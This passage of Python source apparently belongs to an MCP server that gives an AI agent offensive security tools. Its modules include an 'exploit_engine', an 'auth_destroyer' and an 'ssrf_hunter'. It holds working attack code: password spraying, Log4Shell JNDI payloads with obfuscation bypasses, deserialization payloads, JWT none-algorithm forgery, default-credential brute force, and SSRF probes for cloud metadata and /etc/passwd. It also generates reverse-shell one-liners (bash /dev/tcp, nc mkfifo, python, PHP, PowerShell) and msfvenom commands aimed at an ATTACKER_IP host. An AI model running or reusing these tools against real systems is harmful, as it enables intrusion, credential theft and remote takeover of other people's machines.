                    sc = await run_command(["smbclient", f"//{target}/IPC$", "-U", f"{domain}/{user}%{pwd}", "-c", "exit"], timeout=10)
                    if sc.get("success"):
                        sr["found"].append({"user": user, "password": pwd})
                        pentest_memory.store_finding(target, "ad_annihilator", "credentials", {"user": user, "source": "spray"})
                await asyncio.sleep(2)
            results["modules"]["spray"] = sr
        session_manager.complete_execution(execution, results)
        return json.dumps(results, indent=2, default=str)
    except Exception as e:
        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})


# ============================================================================
# MODULE 9: API BREAKER
# ============================================================================

@mcp.tool()
async def api_breaker(
    target: str, depth: str = "deep", modules: str = "all",
    api_type: str = "auto", timeout: int = 600,
) -> str:
    """API exploitation: REST discovery, GraphQL introspection+batch+depth, Spring Actuator, 405 bypass, auth test.
    modules: all|discover,graphql,actuator,method_enum,auth_test"""
    target = InputValidator.sanitize_target(target)
    timeout = InputValidator.validate_timeout(timeout)
    execution = session_manager.start_execution("api_breaker", target, {"depth": depth, "api_type": api_type})
    results = {"target": target, "modules": {}}
    try:
        mod_list = modules.split(",") if modules != "all" else ["discover", "graphql", "actuator", "method_enum", "auth_test"]
        delay = rate_limit_detector.get_delay(target)
        if "discover" in mod_list:
            dr = {"endpoints": [], "openapi": None}
            for path in ["/swagger.json", "/v2/api-docs", "/v3/api-docs", "/openapi.json", "/api-docs", "/docs", "/api/swagger.json"]:
                r = await run_command(["curl", "-sk", "-w", "\n%{http_code}", f"{target}{path}"], timeout=8)
                if r.get("stdout"):
                    lines = r["stdout"].strip().split("\n")
                    status = lines[-1].strip()
                    body = "\n".join(lines[:-1])
                    if status == "200" and len(body) > 50:
                        dr["endpoints"].append({"path": path, "status": 200, "size": len(body)})
                        try:
                            spec = json.loads(body)
                            if "paths" in spec:
                                dr["openapi"] = {"title": spec.get("info", {}).get("title", ""), "paths": list(spec["paths"].keys())[:50], "total": len(spec["paths"])}
                                pentest_memory.store_finding(target, "api_breaker", "api_spec", {"paths": len(spec["paths"])})
                        except (json.JSONDecodeError, KeyError):
                            pass
                await asyncio.sleep(delay * 0.3)
            results["modules"]["discover"] = dr
        if "graphql" in mod_list:
            gr = {"endpoint_found": False, "introspection": None, "vulns": []}
            for gp in ["/graphql", "/api/graphql", "/v1/graphql", "/gql"]:
                iq = json.dumps({"query": "{ __schema { types { name kind fields { name type { name } } } } }"})
                r = await run_command(["curl", "-sk", "-X", "POST", f"{target}{gp}", "-H", "Content-Type: application/json", "-d", iq], timeout=15)
                if r.get("stdout") and "__schema" in r["stdout"]:
                    gr["endpoint_found"] = True
                    gr["endpoint"] = f"{target}{gp}"
                    try:
                        schema = json.loads(r["stdout"])
                        types_d = schema.get("data", {}).get("__schema", {}).get("types", [])
                        gr["introspection"] = {"types_count": len(types_d), "types": [{"name": t["name"], "kind": t["kind"]} for t in types_d if not t["name"].startswith("__")][:30]}
                    except json.JSONDecodeError:
                        pass
                    if depth in ["deep", "aggressive"]:
                        bq = json.dumps([{"query": "{ __typename }"}, {"query": "{ __typename }"}])
                        br = await run_command(["curl", "-sk", "-X", "POST", f"{target}{gp}", "-H", "Content-Type: application/json", "-d", bq], timeout=10)
                        if br.get("stdout"):
                            try:
                                if isinstance(json.loads(br["stdout"]), list):
                                    gr["vulns"].append({"type": "batch_queries_enabled", "severity": "medium"})
                            except json.JSONDecodeError:
                                pass
                    pentest_memory.store_finding(target, "api_breaker", "graphql_found", {"endpoint": f"{target}{gp}"})
                    break
            results["modules"]["graphql"] = gr
        if "actuator" in mod_list:
            ar = {"endpoints": {}, "secrets": []}
            for path in ["/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings", "/actuator/configprops", "/actuator/heapdump", "/actuator/beans", "/manage/env", "/jolokia"]:
                r = await run_command(["curl", "-sk", "-w", "\n%{http_code}", f"{target}{path}"], timeout=8)
                if r.get("stdout"):
                    lines = r["stdout"].strip().split("\n")
                    status = lines[-1].strip()
                    body = "\n".join(lines[:-1])
                    if status == "200":
                        ar["endpoints"][path] = {"accessible": True, "size": len(body), "preview": body[:500]}
                        if "/env" in path:
                            secs = re.findall(r'"(\w*(?:password|secret|key|token)\w*)":\s*"([^"]*)"', body, re.IGNORECASE)
                            for n, v in secs:
                                if v and v != "******":
                                    ar["secrets"].append({"name": n, "value": v[:50]})
                await asyncio.sleep(delay * 0.3)
            if ar["endpoints"]:
                pentest_memory.store_finding(target, "api_breaker", "actuator_exposed", {"endpoints": list(ar["endpoints"].keys()), "secrets": len(ar["secrets"])})
            results["modules"]["actuator"] = ar
        if "method_enum" in mod_list:
            mr = {"endpoints": {}}
            methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"]
            for path in ["/", "/api", "/api/v1", "/admin"][:4]:
                pr = {}
                for m in methods:
                    r = await run_command(["curl", "-sk", "-X", m, "-o", "/dev/null", "-w", "%{http_code}", f"{target}{path}", "-H", "Content-Type: application/json"], timeout=8)
                    if r.get("stdout"):
                        s = r["stdout"].strip()
                        if s.isdigit() and s != "0":
                            pr[m] = int(s)
                            orchestrator.analyze_response_code(target, path, int(s))
                    await asyncio.sleep(delay * 0.2)
                if pr:
                    mr["endpoints"][path] = pr
            results["modules"]["method_enum"] = mr
        if "auth_test" in mod_list:
            atr = {"bypasses": []}
            headers_bypass = [("X-Forwarded-For", "127.0.0.1"), ("X-Original-URL", "/admin"), ("X-Custom-IP-Authorization", "127.0.0.1"), ("Authorization", "Basic YWRtaW46YWRtaW4=")]
            for path in ["/admin", "/api/admin", "/internal"]:
                base = await run_command(["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", f"{target}{path}"], timeout=8)
                bs = base.get("stdout", "").strip()
                if bs in ["401", "403"]:
                    for hn, hv in headers_bypass:
                        br = await run_command(["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", "-H", f"{hn}: {hv}", f"{target}{path}"], timeout=8)
                        brs = br.get("stdout", "").strip()
                        if brs and brs != bs and brs in ["200", "301", "302"]:
                            atr["bypasses"].append({"path": path, "header": f"{hn}: {hv}", "original": int(bs), "bypass": int(brs)})
                    break
            results["modules"]["auth_test"] = atr
        session_manager.complete_execution(execution, results)
        return json.dumps(results, indent=2, default=str)
    except Exception as e:
        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})


# ============================================================================
# MODULE 10: VULN SCANNER ULTRA
# ============================================================================

@mcp.tool()
async def vuln_scanner_ultra(
    target: str, depth: str = "deep", modules: str = "all",
    severity: str = "medium,high,critical", timeout: int = 600,
) -> str:
    """Unified vuln scanner: Nuclei (auto-template), CVE mapping, nmap vuln scripts.
    modules: all|nuclei,cve_map,nmap_vuln,custom"""
    target = InputValidator.sanitize_target(target)
    timeout = InputValidator.validate_timeout(timeout)
    execution = session_manager.start_execution("vuln_scanner_ultra", target, {"depth": depth})
    results = {"target": target, "modules": {}}
    try:
        mod_list = modules.split(",") if modules != "all" else ["nuclei", "cve_map", "nmap_vuln", "custom"]
        if "nuclei" in mod_list:
            nr = {"findings": []}
            na = ["nuclei", "-u", target, "-jsonl", "-silent", "-severity", severity]
            stack = orchestrator.adapt_to_stack(target)
            tags_map = {"spring": "java,spring", "django": "python,django", "express": "nodejs", "php": "php,wordpress", "aspnet": "dotnet,iis", "go": "go"}
            if stack["adapted"] and stack["stack"] in tags_map:
                na.extend(["-tags", tags_map[stack["stack"]]])
            rate = {"stealth": "10", "light": "50", "deep": "150", "aggressive": "300"}.get(depth, "150")
            na.extend(["-rl", rate])
            nres = await run_command(na, timeout=timeout)
            if nres.get("stdout"):
                for line in nres["stdout"].strip().split("\n"):
                    if line.strip():
                        try:
                            f = json.loads(line)
                            nr["findings"].append({"template": f.get("template-id", ""), "name": f.get("info", {}).get("name", ""), "severity": f.get("info", {}).get("severity", ""), "matched": f.get("matched-at", "")})
                        except json.JSONDecodeError:
                            nr["findings"].append({"raw": line[:200]})
            results["modules"]["nuclei"] = nr
            if nr["findings"]:
                pentest_memory.store_finding(target, "vuln_scanner_ultra", "nuclei_vulns", {"count": len(nr["findings"])})
                # Register each nuclei finding with VulnCorrelator + CVSS
                for nf in nr["findings"]:
                    nf_sev = nf.get("severity", "info").lower()
                    cvss_map = {"critical": 9.5, "high": 7.5, "medium": 5.0, "low": 2.5, "info": 0.5}
                    nf_score = cvss_map.get(nf_sev, 3.0)
                    vuln_correlator.add_vulnerability(VulnFinding(
                        vuln_id=nf.get("template", "nuclei_unknown"),
                        title=nf.get("name", nf.get("template", "Nuclei finding")),
                        severity=nf_sev, cvss_score=nf_score, cvss_vector="",
                        target=target, service="http",
                        evidence=nf.get("matched", "")[:200],
                        exploitable=nf_sev in ["critical", "high"],
                        kill_chain_phase="exploitation" if nf_sev in ["critical", "high"] else "reconnaissance",
                        mitre_techniques=["T1190"] if nf_sev in ["critical", "high"] else ["T1595"],
                    ))
        if "cve_map" in mod_list:
            cm = {"services_with_cves": []}
            pf = pentest_memory.get_findings(target, "open_ports")
            if pf:
                for svc in pf[-1].get("data", {}).get("services", []):
                    if svc.get("product") and svc.get("version"):
                        nv = await run_command(["nmap", "--script", "vulners", "-sV", "-p", str(svc["port"]), target, "-oX", "-"], timeout=60)
                        if nv.get("stdout"):
                            cves = list(set(re.findall(r"(CVE-\d{4}-\d+)", nv["stdout"])))
                            if cves:
                                cm["services_with_cves"].append({"port": svc["port"], "product": svc["product"], "version": svc["version"], "cves": cves[:10]})
            results["modules"]["cve_map"] = cm
        if "nmap_vuln" in mod_list:
            nvr = {"vulnerabilities": []}
            scripts = "vuln,exploit,auth" if depth == "aggressive" else "vuln"
            nv = await run_command(["nmap", "--script", scripts, "-sV", target, "-oX", "-"], timeout=min(timeout, 300))
            if nv.get("stdout"):
                try:
                    root = ET.fromstring(nv["stdout"])
                    for s in root.findall(".//script"):
                        out = s.get("output", "")
                        if "VULNERABLE" in out.upper():
                            nvr["vulnerabilities"].append({"script": s.get("id", ""), "output": out[:500]})
                except ET.ParseError:
                    pass
            results["modules"]["nmap_vuln"] = nvr
        if "custom" in mod_list:
            cr = {"checks": []}
            for payload in ["${jndi:ldap://127.0.0.1/t}", "${${lower:j}ndi:${lower:l}dap://127.0.0.1/t}"]:
                for hdr in ["User-Agent", "X-Forwarded-For", "X-Api-Version"]:
                    r = await run_command(["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", "-H", f"{hdr}: {payload}", target], timeout=8)
                    if r.get("stdout", "").strip() not in ["000", ""]:
                        cr["checks"].append({"type": "log4shell_probe", "header": hdr, "status": r["stdout"].strip()})
                        break
                break
            results["modules"]["custom"] = cr
        session_manager.complete_execution(execution, results)
        return json.dumps(results, indent=2, default=str)
    except Exception as e:
        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})


# ============================================================================
# MODULE 11: EXPLOIT ENGINE
# ============================================================================

@mcp.tool()
async def exploit_engine(
    target: str, exploit_type: str = "auto", depth: str = "deep", modules: str = "all",
    lhost: Optional[str] = None, lport: int = 4444, timeout: int = 600,
) -> str:
    """Exploitation: Metasploit, deserialization, Log4Shell (10+ bypass), reverse shells, chains.
    modules: all|metasploit,deser,log4shell,revshell,chain"""
    target = InputValidator.sanitize_target(target)
    timeout = InputValidator.validate_timeout(timeout)
    execution = session_manager.start_execution("exploit_engine", target, {"exploit_type": exploit_type})
    results = {"target": target, "modules": {}}
    try:
        mod_list = modules.split(",") if modules != "all" else ["metasploit", "deser", "log4shell", "revshell", "chain"]
        if "metasploit" in mod_list:
            mr = {"exploits_suggested": []}
            tech = pentest_memory.get_tech(target)
            fw = tech.get("framework", "").lower()
            if "spring" in fw:
                mr["exploits_suggested"] = ["exploit/multi/http/spring4shell", "exploit/multi/http/log4shell_header_injection", "exploit/multi/http/tomcat_mgr_upload"]
            elif "php" in fw:
                mr["exploits_suggested"] = ["exploit/unix/webapp/wp_admin_shell_upload", "exploit/multi/http/php_cgi_arg_injection"]
            elif "aspnet" in fw:
                mr["exploits_suggested"] = ["exploit/windows/http/iis_webdav_upload_asp"]
            results["modules"]["metasploit"] = mr
        if "deser" in mod_list:
            dr = {"tests": []}
            for lang, ct, payload in [("java", "application/x-java-serialized-object", "rO0ABXNyABFqYXZhLmxhbmcuQm9vbGVhbs..."), ("php", "application/x-httpd-php", 'O:4:"Test":0:{}'), ("node", "application/json", '{"rce":"_$$ND_FUNC$$_function(){return 1}()"}')]:
                r = await run_command(["curl", "-sk", "-X", "POST", target, "-H", f"Content-Type: {ct}", "-d", payload, "-w", "\n%{http_code}"], timeout=10)
                if r.get("stdout"):
                    lines = r["stdout"].strip().split("\n")
                    s = lines[-1].strip()
                    dr["tests"].append({"language": lang, "status": int(s) if s.isdigit() else 0, "interesting": s in ["200", "500"]})
            dr["gadget_chains"] = ["CommonsCollections1-7", "Spring1-2", "Groovy1", "JRMPClient", "URLDNS"]
            results["modules"]["deser"] = dr
        if "log4shell" in mod_list:
            lr = {"payloads_tested": 0, "bypass_techniques": []}
            cb = lhost or "127.0.0.1"
            payloads = [
                "${jndi:ldap://CB/t}", "${${lower:j}ndi:${lower:l}dap://CB/t}",
                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://CB/t}",
                "${${env:X:-j}ndi${env:X:-:}${env:X:-l}dap${env:X:-:}//CB/t}",
                "${j${::-n}d${::-i}:l${::-d}a${::-p}://CB/t}",
                "${jndi:dns://CB/t}", "${jndi:rmi://CB/t}",
                "${${upper:j}${upper:n}${upper:d}${upper:i}:${upper:l}dap://CB/t}",
            ]
            hdrs = ["User-Agent", "X-Forwarded-For", "Referer", "X-Api-Version", "Authorization", "Cookie"]
            for pt in payloads:
                p = pt.replace("CB", f"{cb}:{lport}")
                for h in hdrs[:4]:
                    await run_command(["curl", "-sk", "--max-time", "5", target, "-H", f"{h}: {p}"], timeout=8)
                    lr["payloads_tested"] += 1
                await asyncio.sleep(rate_limit_detector.get_delay(target))
            lr["bypass_techniques"] = ["lowercase", "obfuscation", "env_var", "upper", "dns_callback", "rmi", "double_payload", "url_encoding"]
            lr["verify"] = f"Listener: python3 -m http.server {lport} | interactsh-client"
            results["modules"]["log4shell"] = lr
        if "revshell" in mod_list:
            h = lhost or "ATTACKER_IP"
            p = lport
            results["modules"]["revshell"] = {"shells": {
                "bash": f"bash -i >& /dev/tcp/{h}/{p} 0>&1",
                "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{h}\",{p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
                "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {h} {p} >/tmp/f",
                "php": f"php -r '$s=fsockopen(\"{h}\",{p});exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
                "powershell": f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{h}',{p});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+'PS > ');$s.Write($sb,0,$sb.Length)}}\"",
                "listener": f"nc -lvnp {p}",
                "msfvenom_lin": f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={h} LPORT={p} -f elf -o shell",
                "msfvenom_win": f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={h} LPORT={p} -f exe -o shell.exe",
            }}
        if "chain" in mod_list:
            cr = {"chains": []}
            ctx = pentest_memory.get_context(target)
            ft = ctx.get("finding_types", [])
            if "ssrf_found" in ft or "ssrf_potential" in ft:
                cr["chains"].append({"name": "SSRF->Cloud Creds", "steps": ["Exploit SSRF", "Access metadata 169.254.169.254", "Extract IAM creds", "Pivot with AWS CLI"], "severity": "critical"})
            if "sqli_found" in ft:
                cr["chains"].append({"name": "SQLi->RCE", "steps": ["sqlmap --os-shell", "Write webshell", "Reverse shell"], "severity": "critical"})
            if "actuator_exposed" in ft:
                cr["chains"].append({"name": "Actuator->RCE", "steps": ["Dump /env secrets", "Download heapdump", "Extract creds", "Jolokia RCE"], "severity": "critical"})
            results["modules"]["chain"] = cr
        session_manager.complete_execution(execution, results)
        return json.dumps(results, indent=2, default=str)
    except Exception as e:
        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})


# ============================================================================
# MODULE 12: AUTH DESTROYER
# ============================================================================

@mcp.tool()
async def auth_destroyer(
    target: str, depth: str = "deep", modules: str = "all",
    jwt_token: Optional[str] = None, timeout: int = 600,
) -> str:
    """Auth/authz bypass: JWT attacks (none/confusion/brute), IDOR, CORS, default creds, header bypass, path mutation.
    modules: all|jwt,idor,cors,default_creds,header_bypass,path_mutation"""
    target = InputValidator.sanitize_target(target)
    timeout = InputValidator.validate_timeout(timeout)
    execution = session_manager.start_execution("auth_destroyer", target, {"depth": depth})
    results = {"target": target, "modules": {}}
    try:
        mod_list = modules.split(",") if modules != "all" else ["jwt", "idor", "cors", "default_creds", "header_bypass", "path_mutation"]
        delay = rate_limit_detector.get_delay(target)
        if "jwt" in mod_list and jwt_token:
            jr = {"decoded": {}, "attacks": []}
            try:
                parts = jwt_token.split(".")
                if len(parts) == 3:
                    header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
                    payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
                    jr["decoded"] = {"header": header, "payload": payload}
                    none_h = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
                    none_tok = f"{none_h}.{parts[1]}."
                    nr = await run_command(["curl", "-sk", "-H", f"Authorization: Bearer {none_tok}", target, "-w", "\n%{http_code}"], timeout=10)
                    if nr.get("stdout") and nr["stdout"].strip().split("\n")[-1] in ["200", "201"]:
                        jr["attacks"].append({"type": "none_algorithm", "severity": "critical", "success": True})
                    if header.get("alg", "").startswith("RS"):
                        jr["attacks"].append({"type": "alg_confusion_possible", "severity": "high"})
                    for rf in ["role", "admin", "is_admin", "permissions"]:
                        if rf in payload:
                            jr["attacks"].append({"type": "role_manipulation", "field": rf, "original": payload[rf]})
            except Exception as je:
                jr["error"] = str(je)
            results["modules"]["jwt"] = jr
        if "idor" in mod_list:
            ir = {"vulnerabilities": []}
            base = await run_command(["curl", "-sk", f"{target}{'&' if '?' in target else '?'}id=1"], timeout=10)
            bs = len(base.get("stdout", ""))
            for tid in [0, 2, 3, 100, 999]:
                r = await run_command(["curl", "-sk", f"{target}{'&' if '?' in target else '?'}id={tid}"], timeout=10)
                rs = len(r.get("stdout", ""))
                if rs > 100 and rs != bs:
                    ir["vulnerabilities"].append({"id": tid, "size": rs, "baseline": bs})
                await asyncio.sleep(delay)
            results["modules"]["idor"] = ir
        if "cors" in mod_list:
            cr = {"tests": [], "misconfigured": False}
            for origin in ["https://evil.com", "https://attacker.com", "null"]:
                r = await run_command(["curl", "-sk", "-I", "-H", f"Origin: {origin}", target], timeout=10)
                if r.get("stdout"):
                    acao = ""
                    for line in r["stdout"].split("\n"):
                        if "access-control-allow-origin" in line.lower():
                            acao = line.split(":", 1)[1].strip() if ":" in line else ""
                    if acao and (origin in acao or acao == "*"):
                        cr["tests"].append({"origin": origin, "acao": acao, "vulnerable": True})
                        cr["misconfigured"] = True
            results["modules"]["cors"] = cr
        if "default_creds" in mod_list:
            dcr = {"found": []}
            creds = [("admin", "admin"), ("admin", "password"), ("admin", "123456"), ("root", "root"), ("test", "test")]
            for path in ["/login", "/admin/login", "/api/login", "/api/auth/login"]:
                chk = await run_command(["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", f"{target}{path}"], timeout=8)
                if chk.get("stdout", "").strip() in ["200", "401", "302"]:
                    for u, p in creds:
                        lr = await run_command(["curl", "-sk", "-X", "POST", f"{target}{path}", "-H", "Content-Type: application/json", "-d", json.dumps({"username": u, "password": p}), "-w", "\n%{http_code}"], timeout=8)
                        if lr.get("stdout"):
                            lines = lr["stdout"].strip().split("\n")
                            s = lines[-1]
                            body = "\n".join(lines[:-1])
                            if s in ["200", "302"] and any(t in body.lower() for t in ["token", "success", "welcome"]):
                                dcr["found"].append({"path": path, "user": u, "pass": p})
                                pentest_memory.store_finding(target, "auth_destroyer", "default_creds", {"user": u})
                        await asyncio.sleep(delay)
                    break
            results["modules"]["default_creds"] = dcr
        if "header_bypass" in mod_list:
            hbr = {"bypasses": []}
            for path in ["/admin", "/internal", "/dashboard"]:
                base = await run_command(["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", f"{target}{path}"], timeout=8)
                bs = base.get("stdout", "").strip()
                if bs in ["403", "401"]:
                    for hn, hv in [("X-Forwarded-For", "127.0.0.1"), ("X-Original-URL", path), ("X-Real-IP", "127.0.0.1"), ("X-Custom-IP-Authorization", "127.0.0.1")]:
                        br = await run_command(["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", "-H", f"{hn}: {hv}", f"{target}{path}"], timeout=8)
                        brs = br.get("stdout", "").strip()
                        if brs and brs != bs and brs in ["200", "301", "302"]:
                            hbr["bypasses"].append({"path": path, "header": f"{hn}: {hv}", "original": int(bs), "bypass": int(brs)})
                    break
            results["modules"]["header_bypass"] = hbr
        if "path_mutation" in mod_list:
            pmr = {"bypasses": []}
            for m in ["/admin", "/Admin", "/ADMIN", "/admin/", "/%2fadmin", "/admin..;/", "/;/admin", "/.;/admin", "/admin.json"]:
                r = await run_command(["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}|%{size_download}", f"{target}{m}"], timeout=8)
                if r.get("stdout"):
                    parts = r["stdout"].strip().split("|")
                    s = int(parts[0]) if parts[0].isdigit() else 0
                    sz = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
                    if s == 200 and sz > 100:
                        pmr["bypasses"].append({"path": m, "status": s, "size": sz})
                await asyncio.sleep(delay * 0.3)
            results["modules"]["path_mutation"] = pmr
        session_manager.complete_execution(execution, results)
        return json.dumps(results, indent=2, default=str)
    except Exception as e:
        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})


# ============================================================================
# MODULE 13: SSRF HUNTER
# ============================================================================

@mcp.tool()
async def ssrf_hunter(
    target: str, param: Optional[str] = None, depth: str = "deep",
    callback_host: Optional[str] = None, timeout: int = 600,
) -> str:
    """SSRF specialist: URL-based, blind OOB, DNS rebinding, cloud metadata chain, filter bypass, protocol smuggling."""
    target = InputValidator.sanitize_target(target)
    timeout = InputValidator.validate_timeout(timeout)
    execution = session_manager.start_execution("ssrf_hunter", target, {"depth": depth})
    results = {"target": target, "tests": [], "vulnerabilities": []}
    try:
        delay = rate_limit_detector.get_delay(target)
        tp = param or "url"
        payloads = {
            "basic": [("http://127.0.0.1", "localhost"), ("http://localhost", "name"), ("http://[::1]", "ipv6"), ("http://0x7f000001", "hex"), ("http://2130706433", "decimal")],
            "cloud": [("http://169.254.169.254/latest/meta-data/", "AWS"), ("http://metadata.google.internal/computeMetadata/v1/", "GCP"), ("http://169.254.169.254/metadata/instance", "Azure")],
            "bypass": [("http://127.1", "short"), ("http://127.0.0.1@evil.com", "auth"), ("http://0", "zero"), ("http://127.0.0.1:8080", "alt_port")],
            "protocol": [("gopher://127.0.0.1:25/_HELO", "gopher"), ("dict://127.0.0.1:6379/info", "dict"), ("file:///etc/passwd", "file")],
        }
        groups = {"stealth": ["basic"], "light": ["basic", "cloud"], "deep": ["basic", "cloud", "bypass"], "aggressive": list(payloads.keys())}
        for grp in groups.get(depth, ["basic", "cloud"]):
            for payload, desc in payloads.get(grp, []):
                enc = urllib.parse.quote(payload, safe="")
                url = f"{target}{'&' if '?' in target else '?'}{tp}={enc}"
                r = await run_command(["curl", "-sk", "--max-time", "10", url], timeout=15)
                if r.get("stdout"):
                    body = r["stdout"]
                    entry = {"payload": payload, "desc": desc, "group": grp, "size": len(body)}
                    interesting = False
                    if "root:" in body:
                        entry["finding"] = "File read"
                        interesting = True
                    elif any(c in body for c in ["ami-", "instance-id", "iam"]):
                        entry["finding"] = "Cloud metadata"
                        interesting = True
                    elif len(body) > 200 and grp in ["cloud", "protocol"]:
                        entry["finding"] = "Response - investigate"
                        interesting = True
                    results["tests"].append(entry)
                    if interesting:
                        results["vulnerabilities"].append(entry)
                        pentest_memory.store_finding(target, "ssrf_hunter", "ssrf_found", {"payload": payload})
                await asyncio.sleep(delay)
        if depth in ["deep", "aggressive"]:
            results["dns_rebinding"] = {"setup": "Use rebind.network for DNS rebinding bypass"}
        session_manager.complete_execution(execution, results)
        return json.dumps(results, indent=2, default=str)
    except Exception as e:
        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})


# ============================================================================
# MODULE 14: CRYPTO FORENSICS
# ============================================================================

@mcp.tool()
async def crypto_forensics(
    target: str, depth: str = "deep", modules: str = "all", timeout: int = 600,
) -> str:
    """Blockchain audit: smart contract analysis, DeFi protocol scanning, transaction analysis.
    modules: all|contract,defi,tx_analysis"""
    target = InputValidator.sanitize_target(target)
    execution = session_manager.start_execution("crypto_forensics", target, {"depth": depth})
    results = {"target": target, "modules": {}}
    try:
        mod_list = modules.split(",") if modules != "all" else ["contract", "defi", "tx_analysis"]
        if "contract" in mod_list:
            cr = {"checks": []}
            vuln_patterns = [
                ("reentrancy", r"\.call\{value:", "Reentrancy via external call with value"),
                ("unchecked_return", r"\.send\(|\.transfer\(", "Unchecked return value"),
                ("tx_origin", r"tx\.origin", "tx.origin used for auth (phishable)"),
                ("selfdestruct", r"selfdestruct\(|suicide\(", "Selfdestruct present"),
                ("delegatecall", r"delegatecall\(", "Delegatecall (proxy pattern risk)"),
                ("block_timestamp", r"block\.timestamp", "Block timestamp dependency"),
            ]
            if target.startswith("0x") or "etherscan" in target:
                cr["note"] = "Provide contract source code for analysis"
            else:
                for name, pat, desc in vuln_patterns:
                    cr["checks"].append({"vulnerability": name, "pattern": pat, "description": desc})
                cr["tools"] = ["slither", "mythril", "solhint", "echidna"]
            results["modules"]["contract"] = cr
        if "defi" in mod_list:
            dr = {"checks": ["flash_loan_attack", "oracle_manipulation", "front_running", "rug_pull_indicators", "infinite_approval"]}
            results["modules"]["defi"] = dr
        if "tx_analysis" in mod_list:
            tr = {"capabilities": ["trace_transactions", "identify_mixer_usage", "whale_tracking", "MEV_detection"]}
            results["modules"]["tx_analysis"] = tr
        session_manager.complete_execution(execution, results)
        return json.dumps(results, indent=2, default=str)
    except Exception as e:
        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})


# ============================================================================
# MODULE 15: OSINT HARVESTER
# ============================================================================

@mcp.tool()
async def osint_harvester(
    target: str, depth: str = "deep", modules: str = "all", timeout: int = 600,
) -> str:
    """OSINT: subdomain enumeration, DNS recon, domain intel, WHOIS, certificate transparency.
    modules: all|subdomains,dns,whois,crt,dorking"""
    target = InputValidator.sanitize_target(target)
    timeout = InputValidator.validate_timeout(timeout)
    execution = session_manager.start_execution("osint_harvester", target, {"depth": depth})
    results = {"target": target, "modules": {}}
    try:
        mod_list = modules.split(",") if modules != "all" else ["subdomains", "dns", "whois", "crt", "dorking"]
        hostname = target.split("://")[-1].split("/")[0].split(":")[0]
        if "subdomains" in mod_list:
            sr = {"subdomains": [], "sources": []}
            # subfinder
            sf = await run_command(["subfinder", "-d", hostname, "-silent"], timeout=120)
            if sf.get("stdout"):
                sr["subdomains"] = list(set(sf["stdout"].strip().split("\n")))
                sr["sources"].append("subfinder")
            # amass (if available and deep)
            if depth in ["deep", "aggressive"]:
                am = await run_command(["amass", "enum", "-passive", "-d", hostname], timeout=min(timeout, 180))
                if am.get("stdout"):
                    new_subs = [s.strip() for s in am["stdout"].strip().split("\n") if s.strip()]
                    sr["subdomains"] = list(set(sr["subdomains"] + new_subs))
                    sr["sources"].append("amass")
            # crt.sh
            crt = await run_command(["curl", "-sk", f"https://crt.sh/?q=%.{hostname}&output=json"], timeout=30)
            if crt.get("stdout"):
                try:
                    crt_data = json.loads(crt["stdout"])
                    crt_subs = list(set(e.get("name_value", "").strip() for e in crt_data if e.get("name_value")))
                    sr["subdomains"] = list(set(sr["subdomains"] + crt_subs))
                    sr["sources"].append("crt.sh")
                except json.JSONDecodeError:
                    pass
            sr["total"] = len(sr["subdomains"])
            results["modules"]["subdomains"] = sr
            if sr["subdomains"]:
                pentest_memory.store_finding(target, "osint_harvester", "subdomains", {"count": sr["total"]})
        if "dns" in mod_list:
            dr = {"records": {}}
            for rtype in ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "SRV"]:
                r = await run_command(["dig", "+short", rtype, hostname], timeout=10)
                if r.get("stdout") and r["stdout"].strip():
                    dr["records"][rtype] = r["stdout"].strip().split("\n")
            # Zone transfer attempt
            ns_records = dr.get("records", {}).get("NS", [])
            for ns in ns_records[:3]:
                axfr = await run_command(["dig", f"@{ns.rstrip('.')}", hostname, "AXFR", "+short"], timeout=15)
                if axfr.get("stdout") and len(axfr["stdout"]) > 100:
                    dr["zone_transfer"] = {"ns": ns, "success": True, "data": axfr["stdout"][:2000]}
                    pentest_memory.store_finding(target, "osint_harvester", "zone_transfer", {"ns": ns})
                    break
            results["modules"]["dns"] = dr
        if "whois" in mod_list:
            wr = await run_command(["whois", hostname], timeout=30)
            whois_data = {}
            if wr.get("stdout"):
